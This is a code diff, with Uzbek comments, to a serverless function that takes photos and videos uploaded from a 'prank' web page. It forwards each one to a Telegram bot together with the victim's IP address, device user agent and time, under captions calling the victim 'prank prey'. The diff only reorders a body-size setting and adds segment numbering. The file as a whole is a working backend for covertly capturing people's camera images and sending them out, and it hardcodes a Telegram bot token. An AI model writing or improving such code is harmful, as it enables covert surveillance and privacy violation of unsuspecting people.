@@ -1,27 +1,16 @@
 // Vercel Serverless Function: Surat va videoni qabul qilib Telegramga yuborish
 const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
 
-// Vercel body size limitini 50MB ga oshirish (video uchun zarur)
-module.exports.config = {
-  api: {
-    bodyParser: {
-      sizeLimit: '50mb',
-    },
-  },
-};
-
-module.exports = async (req, res) => {
+// ⚠️ Bu config handler DAN KEYIN yozilishi shart — aks holda module.exports qayta yozadi
+const handler = async (req, res) => {
   // CORS ruxsatnomalari
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-
+  if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Faqat POST so\'rovlar qabul qilinadi' });
+    return res.status(405).json({ error: 'Faqat POST so\'rov qabul qilinadi' });
   }
 
   try {
@@ -42,20 +31,20 @@ module.exports = async (req, res) => {
     }
 
     const buffer = Buffer.from(base64, 'base64');
-    
-    // Foydalanuvchi ma'lumotlari
+
+    // Foydalanuvchi haqida ma'lumot
     const rawIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Noma\'lum';
     const ip = String(rawIp).split(',')[0].trim();
     const ua = req.headers['user-agent'] || 'Noma\'lum';
     const time = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
+    const segment = req.body.segment !== undefined ? ` | Segment #${req.body.segment}` : '';
 
-    // Telegram uchun sarlavha (caption)
     const icon = type === 'video' ? '🎥' : '📸';
     const caption =
-      `${icon} <b>Yangi prank o'ljasi tushdi!</b>\n\n` +
+      `${icon} <b>Yangi prank o'ljasi!${segment}</b>\n\n` +
       `📅 <b>Vaqt:</b> ${time}\n` +
       `🌐 <b>IP:</b> <code>${ip}</code>\n` +
-      `📱 <b>Qurilma:</b> <i>${ua.substring(0, 120)}</i>`;
+      `📱 <b>Qurilma:</b> <i>${ua.substring(0, 100)}</i>`;
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
@@ -76,13 +65,11 @@ module.exports = async (req, res) => {
 
       // Agar sendVideo format xatosi bersa, sendDocument orqali yuborish
       if (!tgData.ok) {
-        console.warn('sendVideo xatosi, sendDocument sinab ko\'rilmoqda:', tgData.description);
         const docForm = new FormData();
         docForm.append('chat_id', chat_id);
         docForm.append('caption', caption);
         docForm.append('parse_mode', 'HTML');
         docForm.append('document', blob, `prank_video.${ext}`);
-
         tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
           method: 'POST',
           body: docForm
@@ -92,16 +79,13 @@ module.exports = async (req, res) => {
 
       return res.status(200).json(tgData);
     } else {
-      // Standart holat: Foto
       const blob = new Blob([buffer], { type: mime });
       formData.append('photo', blob, 'prank_photo.jpg');
-
       const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
       });
       const tgData = await tgRes.json();
-
       return res.status(200).json(tgData);
     }
   } catch (err) {
@@ -109,3 +93,14 @@ module.exports = async (req, res) => {
     return res.status(500).json({ error: err.message });
   }
 };
+
+// ✅ Config handler ga biriktiriladi — module.exports qayta yozilganda saqlanadi
+handler.config = {
+  api: {
+    bodyParser: {
+      sizeLimit: '50mb',
+    },
+  },
+};
+
+module.exports = handler;
